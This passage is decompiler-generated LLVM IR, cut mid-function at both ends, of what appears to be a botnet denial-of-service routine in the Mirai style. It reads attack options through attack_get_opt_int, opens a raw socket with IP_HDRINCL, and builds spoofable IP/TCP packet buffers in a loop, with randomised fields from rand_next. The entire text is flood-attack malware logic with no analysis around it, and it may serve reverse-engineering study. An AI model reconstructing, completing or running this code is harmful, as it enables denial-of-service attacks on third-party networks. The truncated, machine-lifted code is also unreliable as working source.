  %v6_8a04 = inttoptr i32 %v0_89f8 to i32*
  %v7_8a04 = call i32 @attack_get_opt_int(i32 %v0_89fc, i32* %v6_8a04, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v6_89e0)
  %v0_8a08 = load i32, i32* @r5, align 4
  store i32 %v0_8a08, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_8a04, i32* %fp.global-to-local, align 4
  %v0_8a18 = load i32, i32* @r4, align 4
  store i32 %v0_8a18, i32* %r0.global-to-local, align 4
  %v5_8a1c = inttoptr i32 %v0_8a08 to i32*
  %v6_8a1c = call i32 @attack_get_opt_int(i32 %v0_8a18, i32* %v5_8a1c, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_8a24 = urem i32 %v6_8a1c, 256
  store i32 %v1_8a24, i32* %ip.global-to-local, align 4
  %v0_8a28 = load i32, i32* @r5, align 4
  store i32 %v0_8a28, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8a34 = load i32, i32* @r4, align 4
  store i32 %v0_8a34, i32* %r0.global-to-local, align 4
  %v6_8a3c = inttoptr i32 %v0_8a28 to i32*
  %v7_8a3c = call i32 @attack_get_opt_int(i32 %v0_8a34, i32* %v6_8a3c, i32 5, i32 1, i32 %v1_8a24)
  %v1_8a48 = urem i32 %v7_8a3c, 256
  store i32 %v1_8a48, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_8a54 = load i32, i32* @r5, align 4
  store i32 %v0_8a54, i32* %r1.global-to-local, align 4
  %v0_8a58 = load i32, i32* @r4, align 4
  store i32 %v0_8a58, i32* %r0.global-to-local, align 4
  %v5_8a60 = inttoptr i32 %v0_8a54 to i32*
  %v6_8a60 = call i32 @attack_get_opt_int(i32 %v0_8a58, i32* %v5_8a60, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v1_8a48)
  %v0_8a68 = load i32, i32* @r5, align 4
  store i32 %v0_8a68, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_8a60, i32* @r8, align 4
  %v0_8a78 = load i32, i32* @r4, align 4
  store i32 %v0_8a78, i32* %r0.global-to-local, align 4
  %v5_8a7c = inttoptr i32 %v0_8a68 to i32*
  %v6_8a7c = call i32 @attack_get_opt_int(i32 %v0_8a78, i32* %v5_8a7c, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 ptrtoint (i32* @0 to i32))
  %v0_8a80 = load i32, i32* @r5, align 4
  store i32 %v0_8a80, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_8a7c, i32* @r7, align 4
  %v0_8a90 = load i32, i32* @r4, align 4
  store i32 %v0_8a90, i32* %r0.global-to-local, align 4
  %v5_8a94 = inttoptr i32 %v0_8a80 to i32*
  %v6_8a94 = call i32 @attack_get_opt_int(i32 %v0_8a90, i32* %v5_8a94, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8aa4 = load i32, i32* @r5, align 4
  store i32 %v0_8aa4, i32* %r1.global-to-local, align 4
  %v0_8aa8 = load i32, i32* @r4, align 4
  store i32 %v0_8aa8, i32* %r0.global-to-local, align 4
  %v5_8aac = inttoptr i32 %v0_8aa4 to i32*
  %v6_8aac = call i32 @attack_get_opt_int(i32 %v0_8aa8, i32* %v5_8aac, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_8ab4 = urem i32 %v6_8aac, 256
  store i32 %v1_8ab4, i32* %ip.global-to-local, align 4
  %v0_8ab8 = load i32, i32* @r5, align 4
  store i32 %v0_8ab8, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8ac4 = load i32, i32* @r4, align 4
  store i32 %v0_8ac4, i32* %r0.global-to-local, align 4
  %v5_8acc = inttoptr i32 %v0_8ab8 to i32*
  %v6_8acc = call i32 @attack_get_opt_int(i32 %v0_8ac4, i32* %v5_8acc, i32 19, i32 0, i32 %v1_8ab4)
  %v0_8ad4 = load i32, i32* @r5, align 4
  store i32 %v0_8ad4, i32* %r1.global-to-local, align 4
  %v2_8ad8 = load i32, i32* @global_var_24f78.59, align 4
  store i32 %v2_8ad8, i32* %r3.global-to-local, align 4
  store i32 %v6_8acc, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_8ae4 = load i32, i32* @r4, align 4
  store i32 %v0_8ae4, i32* %r0.global-to-local, align 4
  %v5_8ae8 = inttoptr i32 %v0_8ad4 to i32*
  %v6_8ae8 = call i32 @attack_get_opt_int(i32 %v0_8ae4, i32* %v5_8ae8, i32 25, i32 %v2_8ad8, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_8afc = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  %v7_8b00 = icmp eq i32 %v3_8afc, -1
  store i1 %v7_8b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8b00, label %dec_label_pc_9014, label %dec_label_pc_8b0c

dec_label_pc_8b0c:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_8b14 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_8b14, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_8b28 = call i32 @__GI_setsockopt(i32 %v3_8afc, i32 0, i32 3, i32 %v6_8b14, i32 4)
  store i32 %v5_8b28, i32* %r0.global-to-local, align 4
  %v7_8b2c = icmp eq i32 %v5_8b28, -1
  store i1 %v7_8b2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8b2c, label %dec_label_pc_900c, label %dec_label_pc_8b34

dec_label_pc_8b34:                                ; preds = %dec_label_pc_8b0c
  %v0_8b34 = load i32, i32* @r8, align 4
  %v0_8b38 = load i32, i32* @r7, align 4
  %v0_8b3c = load i32, i32* %fp.global-to-local, align 4
  %v0_8b40 = load i32, i32* @r6, align 4
  %v1_8b40 = urem i32 %v0_8b40, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_8b48 = urem i32 %v0_8b34, 65536
  store i32 %v3_8b48, i32* %r3.global-to-local, align 4
  %v3_8b4c = urem i32 %v0_8b38, 65536
  store i32 %v3_8b4c, i32* %r4.global-to-local, align 4
  %v0_8b50 = load i32, i32* @sl, align 4
  %v2_8b50 = icmp eq i32 %v0_8b50, 0
  store i1 %v2_8b50, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_8b68 = urem i32 %v0_8b3c, 65536
  store i32 %v3_8b68, i32* @fp, align 4
  br i1 %v2_8b50, label %dec_label_pc_9020, label %dec_label_pc_8b78

dec_label_pc_8b78:                                ; preds = %dec_label_pc_8b34
  %v3_8b38 = mul i32 %v0_8b38, 65536
  %v3_8b34 = mul i32 %v0_8b34, 65536
  %v0_8b3c.not = or i32 %v0_8b3c, -65536
  %v1_8b7c = xor i32 %v0_8b3c.not, 65535
  %v3_8b80 = mul i32 %v6_8a94, 65536
  %v1_8b84 = add i32 %v3_8b80, 4325376
  %tmp73 = udiv i32 %v1_8b84, 256
  %v3_8b98 = and i32 %tmp73, 65280
  %tmp74 = mul nsw i32 %v1_8b7c, 256
  %v3_8b9c = and i32 %tmp74, 65280
  store i32 %v3_8b9c, i32* %ip.global-to-local, align 4
  %v1_8ba0 = add i32 %v3_8b80, 524288
  %v1_8ba8 = add i32 %v3_8b80, 1835008
  %tmp75 = udiv i32 %v1_8b7c, 256
  %v4_8bac = urem i32 %tmp75, 256
  %v5_8bac = or i32 %v4_8bac, %v3_8b9c
  %v4_8bb4 = udiv i32 %v1_8b84, 16777216
  %v5_8bb4 = or i32 %v3_8b98, %v4_8bb4
  store i32 %v5_8bb4, i32* @r8, align 4
  %v3_8bc0 = udiv i32 %v1_8ba8, 256
  %tmp76 = mul i32 %v0_8b3c, 256
  %v3_8bc4 = and i32 %tmp76, 65280
  store i32 %v3_8b34, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_8b3c, 256
  %v4_8bd4 = urem i32 %tmp77, 256
  %v5_8bd4 = or i32 %v4_8bd4, %v3_8bc4
  store i32 %v5_8bd4, i32* %r0.global-to-local, align 4
  %tmp78 = mul i32 %v0_8b34, 256
  %v3_8bd8 = and i32 %tmp78, 65280
  %v1_8bdc = and i32 %v3_8bc0, 65280
  store i32 %v1_8bdc, i32* @r6, align 4
  store i32 %v3_8b38, i32* %r1.global-to-local, align 4
  %tmp79 = mul i32 %v0_8b38, 256
  %v3_8be8 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v0_8b34, 256
  %v4_8bec = urem i32 %tmp80, 256
  %v5_8bec = or i32 %v4_8bec, %v3_8bd8
  store i32 %v5_8bec, i32* @lr, align 4
  %v4_8bf0 = udiv i32 %v1_8ba8, 16777216
  %v5_8bf0 = or i32 %v1_8bdc, %v4_8bf0
  store i32 %v5_8bf0, i32* %r3.global-to-local, align 4
  %tmp81 = udiv i32 %v0_8b38, 256
  %v4_8bf4 = urem i32 %tmp81, 256
  %v5_8bf4 = or i32 %v4_8bf4, %v3_8be8
  %tmp82 = udiv i32 %v1_8ba0, 256
  %v3_8bf8 = and i32 %tmp82, 65280
  store i32 %v3_8bf8, i32* @r5, align 4
  %v5_8bfc = trunc i32 %v5_8bd4 to i16
  %v5_8c04 = trunc i32 %v5_8bf0 to i16
  %v4_8c0c = udiv i32 %v1_8ba0, 16777216
  %v5_8c0c = or i32 %v3_8bf8, %v4_8c0c
  store i32 %v5_8c0c, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v1_8c74 = trunc i32 %v6_8a1c to i8
  %sext = mul nuw i32 %v5_8bac, 65536
  %v4_8d00 = sdiv i32 %sext, 65536
  %v2_8d2c = icmp eq i32 %v1_8b40, 0
  %sext8 = mul nuw i32 %v5_8bec, 65536
  %v4_8d4c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_8bf4, 65536
  %v4_8d54 = sdiv i32 %sext9, 65536
  %v1_8d0c27 = trunc i32 %v4_8d00 to i16
  br label %dec_label_pc_8c14

dec_label_pc_8c14:                                ; preds = %bb85, %dec_label_pc_8b78
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_8c20 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_8c20, i32* %r0.global-to-local, align 4
  %v2_8c28 = load i32, i32* @r4, align 4
  %v5_8c28 = mul i32 %v2_8c28, 4
  %v6_8c28 = add i32 %v5_8c28, %v2_89c8
  %v7_8c28 = inttoptr i32 %v6_8c28 to i32*
  store i32 %v2_8c20, i32* %v7_8c28, align 4
  %v3_8c2c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8c2c, i32* %r2.global-to-local, align 4
  %v5_8c34 = mul i32 %v3_8c2c, 24
  %v1_8c38 = load i32, i32* @sb, align 4
  %v2_8c38 = add i32 %v1_8c38, %v5_8c34
  store i32 %v2_8c38, i32* @lr, align 4
  store i32 %v2_89c8, i32* %r3.global-to-local, align 4
  %v4_8c40 = mul i32 %v3_8c2c, 4
  %v5_8c40 = add i32 %v4_8c40, %v2_89c8
  %v6_8c40 = inttoptr i32 %v5_8c40 to i32*
  %v7_8c40 = load i32, i32* %v6_8c40, align 4
  store i32 %v7_8c40, i32* %r4.global-to-local, align 4
  %v1_8c44 = inttoptr i32 %v7_8c40 to i8*
  %v2_8c44 = load i8, i8* %v1_8c44, align 1
  %tmp = urem i8 %v2_8c44, 16
  %v1_8c48 = zext i8 %tmp to i32
  %v1_8c4c = or i32 %v1_8c48, 64
  store i32 %v1_8c4c, i32* %r3.global-to-local, align 4
  %v1_8c50 = trunc i32 %v1_8c4c to i8
  store i8 %v1_8c50, i8* %v1_8c44, align 1
  %v0_8c54 = load i32, i32* %r4.global-to-local, align 4
  %v1_8c54 = inttoptr i32 %v0_8c54 to i8*
  %v2_8c54 = load i8, i8* %v1_8c54, align 1
  %v1_8c58 = and i8 %v2_8c54, -16
  %v1_8c5c = or i8 %v1_8c58, 5
  store i32 %v1_8a48, i32* %r5.global-to-local, align 4
  store i8 %v1_8c5c, i8* %v1_8c54, align 1
  store i32 %v6_89e0, i32* %r1.global-to-local, align 4
  %v2_8c6c = load i32, i32* %r4.global-to-local, align 4
  %v3_8c6c = add i32 %v2_8c6c, 1
  %v4_8c6c = inttoptr i32 %v3_8c6c to i8*
  store i8 %v5_8a00, i8* %v4_8c6c, align 1
  store i32 %v1_8a24, i32* %r2.global-to-local, align 4
  %v2_8c74 = load i32, i32* %r4.global-to-local, align 4
  %v3_8c74 = add i32 %v2_8c74, 8
  %v4_8c74 = inttoptr i32 %v3_8c74 to i8*
  store i8 %v1_8c74, i8* %v4_8c74, align 1
  %v2_8c7c = load i32, i32* %r4.global-to-local, align 4
  %v3_8c7c = add i32 %v2_8c7c, 4
  %v4_8c7c = inttoptr i32 %v3_8c7c to i16*
  store i16 %v5_8bfc, i16* %v4_8c7c, align 2
  %v2_8c84 = load i32, i32* %r4.global-to-local, align 4
  %v3_8c84 = add i32 %v2_8c84, 9
  %v4_8c84 = inttoptr i32 %v3_8c84 to i8*
  store i8 47, i8* %v4_8c84, align 1
  store i32 %v6_8ae8, i32* %r3.global-to-local, align 4
  %v0_8c8c = load i32, i32* %r5.global-to-local, align 4
  %v2_8c8c = icmp eq i32 %v0_8c8c, 0
  store i1 %v2_8c8c, i1* %cpsr_z.global-to-local, align 1
  %v1_8c90 = load i32, i32* %r4.global-to-local, align 4
  %v2_8c90 = add i32 %v1_8c90, 12
  %v3_8c90 = inttoptr i32 %v2_8c90 to i32*
  store i32 %v6_8ae8, i32* %v3_8c90, align 4
  br i1 %v2_8c8c, label %.thread25, label %bb

bb:                                               ; preds = %dec_label_pc_8c14
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_8c98 = load i32, i32* %r4.global-to-local, align 4
  %v4_8c98 = add i32 %v3_8c98, 6
  %v5_8c98 = inttoptr i32 %v4_8c98 to i16*
  store i16 64, i16* %v5_8c98, align 2
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_8c14, %bb
  %v0_8c9c = load i32, i32* @lr, align 4
  %v1_8c9c = add i32 %v0_8c9c, 16
  %v2_8c9c = inttoptr i32 %v1_8c9c to i32*
  %v3_8c9c = load i32, i32* %v2_8c9c, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_8ca4 = load i32, i32* %r4.global-to-local, align 4
  %v2_8ca4 = add i32 %v1_8ca4, 16
  %v3_8ca4 = inttoptr i32 %v2_8ca4 to i32*
  store i32 %v3_8c9c, i32* %v3_8ca4, align 4
  %v0_8ca8 = load i32, i32* %r4.global-to-local, align 4
  %v1_8ca8 = add i32 %v0_8ca8, 24
  store i32 %v1_8ca8, i32* %r1.global-to-local, align 4
  %v1_8cac = add i32 %v0_8ca8, 20
  store i32 %v1_8cac, i32* %r0.global-to-local, align 4
  %v0_8cb0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8cb0 = add i32 %v0_8cb0, 101
  store i32 %v1_8cb0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_8cbc = load i32, i32* @r8, align 4
  %v1_8cbc = trunc i32 %v0_8cbc to i16
  %v3_8cbc = add i32 %v0_8ca8, 2
  %v4_8cbc = inttoptr i32 %v3_8cbc to i16*
  store i16 %v1_8cbc, i16* %v4_8cbc, align 2
  %v0_8cc0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8cc0 = trunc i32 %v0_8cc0 to i16
  %v2_8cc0 = load i32, i32* %r0.global-to-local, align 4
  %v3_8cc0 = add i32 %v2_8cc0, 2
  %v4_8cc0 = inttoptr i32 %v3_8cc0 to i16*
  store i16 %v1_8cc0, i16* %v4_8cc0, align 2
  %v0_8cc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_8cc4 = trunc i32 %v0_8cc4 to i8
  %v2_8cc4 = load i32, i32* %r1.global-to-local, align 4
  %v3_8cc4 = add i32 %v2_8cc4, 13
  %v4_8cc4 = inttoptr i32 %v3_8cc4 to i8*
  store i8 %v1_8cc4, i8* %v4_8cc4, align 1
  %v0_8cc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_8cc8 = trunc i32 %v0_8cc8 to i8
  %v2_8cc8 = load i32, i32* %r1.global-to-local, align 4
  %v3_8cc8 = add i32 %v2_8cc8, 12
  %v4_8cc8 = inttoptr i32 %v3_8cc8 to i8*
  store i8 %v1_8cc8, i8* %v4_8cc8, align 1
  %v0_8ccc = load i32, i32* %r4.global-to-local, align 4
  %v1_8ccc = add i32 %v0_8ccc, 38
  %v2_8ccc = inttoptr i32 %v1_8ccc to i8*
  %v3_8ccc = load i8, i8* %v2_8ccc, align 1
  %tmp87 = urem i8 %v3_8ccc, 16
  %v1_8cd0 = zext i8 %tmp87 to i32
  %v1_8cd4 = or i32 %v1_8cd0, 64
  store i32 %v1_8cd4, i32* %r3.global-to-local, align 4
  %v1_8cd8 = trunc i32 %v1_8cd4 to i8
  store i8 %v1_8cd8, i8* %v2_8ccc, align 1
  %v0_8cdc = load i32, i32* %r4.global-to-local, align 4
  %v1_8cdc = add i32 %v0_8cdc, 38
  %v2_8cdc = inttoptr i32 %v1_8cdc to i8*
  %v3_8cdc = load i8, i8* %v2_8cdc, align 1
  %v1_8ce0 = and i8 %v3_8cdc, -16
  %v1_8ce4 = or i8 %v1_8ce0, 5
  store i8 %v1_8ce4, i8* %v2_8cdc, align 1
  %v0_8cf0 = load i32, i32* %r4.global-to-local, align 4
  %v1_8cf0 = add i32 %v0_8cf0, 38
  store i32 %v1_8cf0, i32* @r5, align 4
  %v3_8cf4 = add i32 %v0_8cf0, 39
  %v4_8cf4 = inttoptr i32 %v3_8cf4 to i8*
  store i8 %v5_8a00, i8* %v4_8cf4, align 1
  store i32 %v5_8bf0, i32* %r2.global-to-local, align 4
  %v2_8cfc = load i32, i32* @r5, align 4
  %v3_8cfc = add i32 %v2_8cfc, 2
  %v4_8cfc = inttoptr i32 %v3_8cfc to i16*
  store i16 %v5_8c04, i16* %v4_8cfc, align 2
  store i32 %v4_8d00, i32* %r3.global-to-local, align 4
  store i32 %v1_8a24, i32* %r1.global-to-local, align 4
  %v0_8d08 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8d08, label %.thread26, label %bb83

.thread26:                                        ; preds = %.thread25
  %v2_8d0c28 = load i32, i32* @r5, align 4
  %v3_8d0c29 = add i32 %v2_8d0c28, 4
  %v4_8d0c30 = inttoptr i32 %v3_8d0c29 to i16*
  store i16 %v1_8d0c27, i16* %v4_8d0c30, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %.thread25
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_8d0c = load i32, i32* @r5, align 4
  %v3_8d0c = add i32 %v2_8d0c, 4
  %v4_8d0c = inttoptr i32 %v3_8d0c to i16*
  store i16 %v1_8d0c27, i16* %v4_8d0c, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  %v1_8d14 = load i32, i32* %r2.global-to-local, align 4
  %v2_8d14 = trunc i32 %v1_8d14 to i16
  %v3_8d14 = load i32, i32* @r5, align 4
  %v4_8d14 = add i32 %v3_8d14, 6
  %v5_8d14 = inttoptr i32 %v4_8d14 to i16*
  store i16 %v2_8d14, i16* %v5_8d14, align 2
  br label %bb84

bb84:                                             ; preds = %.thread26, %bb83
  %v0_8d18 = load i32, i32* %r1.global-to-local, align 4
  %v1_8d18 = trunc i32 %v0_8d18 to i8
  %v2_8d18 = load i32, i32* @r5, align 4
  %v3_8d18 = add i32 %v2_8d18, 8
  %v4_8d18 = inttoptr i32 %v3_8d18 to i8*
  store i8 %v1_8d18, i8* %v4_8d18, align 1
  %v0_8d1c = load i32, i32* %r3.global-to-local, align 4
  %v1_8d1c = trunc i32 %v0_8d1c to i8
  %v2_8d1c = load i32, i32* @r5, align 4
  %v3_8d1c = add i32 %v2_8d1c, 9
  %v4_8d1c = inttoptr i32 %v3_8d1c to i8*
  store i8 %v1_8d1c, i8* %v4_8d1c, align 1
  %v0_8d20 = call i32 @rand_next()
  store i32 %v0_8d20, i32* %r0.global-to-local, align 4
  store i32 %v1_8b40, i32* %r1.global-to-local, align 4
  store i1 %v2_8d2c, i1* %cpsr_z.global-to-local, align 1
  %v1_8d30 = sub i32 1023, %v0_8d20
  store i32 %v1_8d30, i32* %r3.global-to-local, align 4
  br i1 %v2_8d2c, label %.thread, label %.thread10

.thread:                                          ; preds = %bb84
  %v2_8d38 = load i32, i32* @r5, align 4
  %v3_8d38 = add i32 %v2_8d38, 16
  %v4_8d38 = inttoptr i32 %v3_8d38 to i32*
  store i32 %v1_8d30, i32* %v4_8d38, align 4
  br label %bb85

.thread10:                                        ; preds = %bb84
  %v1_8d34 = load i32, i32* %r4.global-to-local, align 4
  %v2_8d34 = add i32 %v1_8d34, 16
  %v3_8d34 = inttoptr i32 %v2_8d34 to i32*
  %v4_8d34 = load i32, i32* %v3_8d34, align 4
  store i32 %v4_8d34, i32* %r3.global-to-local, align 4
  %v2_8d3c = load i32, i32* @r5, align 4
  %v3_8d3c = add i32 %v2_8d3c, 16
  %v4_8d3c = inttoptr i32 %v3_8d3c to i32*
  store i32 %v4_8d34, i32* %v4_8d3c, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %.thread10
  %v1_8d40 = load i32, i32* @r5, align 4
  %v2_8d40 = add i32 %v1_8d40, 12
  %v3_8d40 = inttoptr i32 %v2_8d40 to i32*
  store i32 %v0_8d20, i32* %v3_8d40, align 4
  %v3_8d44 = load i32, i32* %stack_var_-44, align 4
  %v0_8d48 = load i32, i32* %r4.global-to-local, align 4
  %v1_8d48 = add i32 %v0_8d48, 58
  store i32 %v1_8d48, i32* @r6, align 4
  store i32 %v4_8d4c, i32* %r2.global-to-local, align 4
  %v1_8d50 = add i32 %v3_8d44, 1
  store i32 %v1_8d50, i32* @r4, align 4
  store i32 %v4_8d54, i32* %r3.global-to-local, align 4
  %v1_8d58 = load i32, i32* @sl, align 4
  %v9_8d58 = icmp eq i32 %v1_8d50, %v1_8d58
  store i1 %v9_8d58, i1* %cpsr_z.global-to-local, align 1
  %v0_8d5c = load i32, i32* @r7, align 4
  %v1_8d5c = trunc i32 %v0_8d5c to i16
  %v3_8d5c = add i32 %v0_8d48, 62
  %v4_8d5c = inttoptr i32 %v3_8d5c to i16*
  store i16 %v1_8d5c, i16* %v4_8d5c, align 2
  %v0_8d60 = load i32, i32* %r2.global-to-local, align 4
  %v1_8d60 = trunc i32 %v0_8d60 to i16
  %v2_8d60 = load i32, i32* @r6, align 4
  %v3_8d60 = inttoptr i32 %v2_8d60 to i16*
  store i16 %v1_8d60, i16* %v3_8d60, align 2
  %v0_8d64 = load i32, i32* %r3.global-to-local, align 4
  %v1_8d64 = trunc i32 %v0_8d64 to i16
  %v2_8d64 = load i32, i32* @r6, align 4
  %v3_8d64 = add i32 %v2_8d64, 2
  %v4_8d64 = inttoptr i32 %v3_8d64 to i16*
  store i16 %v1_8d64, i16* %v4_8d64, align 2
  %v0_8d68 = load i32, i32* @r4, align 4
  store i32 %v0_8d68, i32* %stack_var_-44, align 4
  %v5_8d6c = icmp slt i32 %v1_8d50, %v1_8d58
  br i1 %v5_8d6c, label %dec_label_pc_8c14, label %dec_label_pc_8d70

dec_label_pc_8d70:                                ; preds = %bb85
  %v1_8d78 = add i32 %v6_8a94, 8
  store i32 %v1_8d78, i32* %r4.global-to-local, align 4
  %v1_8d7c = add i32 %v6_8a94, 66
  store i32 %v1_8d7c, i32* %r5.global-to-local, align 4
  %v0_8d8c.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_8d88.preheader

dec_label_pc_8d88.preheader:                      ; preds = %dec_label_pc_8d70, %dec_label_pc_9020
  %v0_8d8c.pre = phi i32 [ %v0_8d8c.pre.pre, %dec_label_pc_8d70 ], [ 0, %dec_label_pc_9020 ]
  %stack_var_-132.0.ph = phi i32 [ %v1_8d7c, %dec_label_pc_8d70 ], [ %v1_902c, %dec_label_pc_9020 ]
  %stack_var_-136.0.ph = phi i32 [ %v1_8d78, %dec_label_pc_8d70 ], [ %v1_9028, %dec_label_pc_9020 ]
  %v2_8fdc = icmp eq i32 %v1_8b40, 0
  %v2_8e24 = ptrtoint i32* %stack_var_-48 to i32
  %v2_8e3c = ptrtoint i32* %stack_var_-52 to i32
  %v2_8e4c = ptrtoint i32* %stack_var_-56 to i32
  %v2_8e58 = ptrtoint i32* %stack_var_-54 to i32
  %v2_8e6c = icmp eq i32 %v1_8ab4, 0
  %v2_8dcc = icmp eq i32 %v6_8ae8, -1
  %v7_8dcc = icmp eq i32 %v6_8ae8, -1
  br label %dec_label_pc_8d88

dec_label_pc_8d88:                                ; preds = %dec_label_pc_8d88, %dec_label_pc_8e74, %dec_label_pc_8d88.preheader
  %v0_8d8c = phi i32 [ %v0_8d8c.pre, %dec_label_pc_8d88.preheader ], [ 0, %dec_label_pc_8d88 ], [ %v1_8f10, %dec_label_pc_8e74 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_8d8c = icmp eq i32 %v0_8d8c, 0
  store i1 %v2_8d8c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_8d8c, label %dec_label_pc_8d88, label %dec_label_pc_8d98

dec_label_pc_8d98:                                ; preds = %dec_label_pc_8d88
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8d9c

dec_label_pc_8d9c:                                ; preds = %dec_label_pc_8e74, %dec_label_pc_8d98
  %v1_8db0 = phi i32 [ %v1_8f0c, %dec_label_pc_8e74 ], [ 0, %dec_label_pc_8d98 ]
  %v5_8da0 = mul i32 %v1_8db0, 24
  %v1_8da4 = load i32, i32* @sb, align 4
  %v2_8da4 = add i32 %v1_8da4, %v5_8da0
  store i32 %v2_8da4, i32* %r3.global-to-local, align 4
  store i32 %v2_89c8, i32* %r4.global-to-local, align 4
  %v1_8dac = add i32 %v2_8da4, 20
  %v2_8dac = inttoptr i32 %v1_8dac to i8*
  %v3_8dac = load i8, i8* %v2_8dac, align 1
  %v4_8dac = zext i8 %v3_8dac to i32
  store i32 %v4_8dac, i32* %r2.global-to-local, align 4
  %v4_8db0 = mul i32 %v1_8db0, 4
  %v5_8db0 = add i32 %v4_8db0, %v2_89c8
  %v6_8db0 = inttoptr i32 %v5_8db0 to i32*
  %v7_8db0 = load i32, i32* %v6_8db0, align 4
  store i32 %v7_8db0, i32* @r5, align 4
  %v7_8db4 = icmp eq i8 %v3_8dac, 31
  store i1 %v7_8db4, i1* %cpsr_z.global-to-local, align 1
  %v1_8db8 = add i32 %v7_8db0, 24
  store i32 %v1_8db8, i32* @r7, align 4
  %v1_8dbc = add i32 %v7_8db0, 38
  store i32 %v1_8dbc, i32* @r6, align 4
  %v1_8dc0 = add i32 %v7_8db0, 58
  store i32 %v1_8dc0, i32* @r8, align 4
  %tmp88 = icmp ult i8 %v3_8dac, 32
  br i1 %tmp88, label %dec_label_pc_8f20, label %dec_label_pc_8dc8

dec_label_pc_8dc8:                                ; preds = %dec_label_pc_8d9c
  store i32 %v6_8ae8, i32* %r1.global-to-local, align 4
  store i1 %v7_8dcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8dcc, label %dec_label_pc_8f80, label %dec_label_pc_8dd4

dec_label_pc_8dd4:                                ; preds = %dec_label_pc_8f20, %dec_label_pc_8dc8
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r4.global-to-local, align 4
  %v0_8ddc = load i32, i32* @fp, align 4
  %v9_8ddc = icmp eq i32 %v0_8ddc, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  store i1 %v9_8ddc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8ddc, label %dec_label_pc_8f98, label %dec_label_pc_8de4

dec_label_pc_8de4:                                ; preds = %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge, %dec_label_pc_8dd4
  %v1_8de8 = phi i32 [ %v1_8de8.pre, %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), %dec_label_pc_8dd4 ]
  store i32 %v3_8b48, i32* %r2.global-to-local, align 4
  %v9_8de8 = icmp eq i32 %v3_8b48, %v1_8de8
  store i1 %v9_8de8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8de8, label %dec_label_pc_8fc0, label %dec_label_pc_8df0

dec_label_pc_8df0:                                ; preds = %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge, %dec_label_pc_8de4
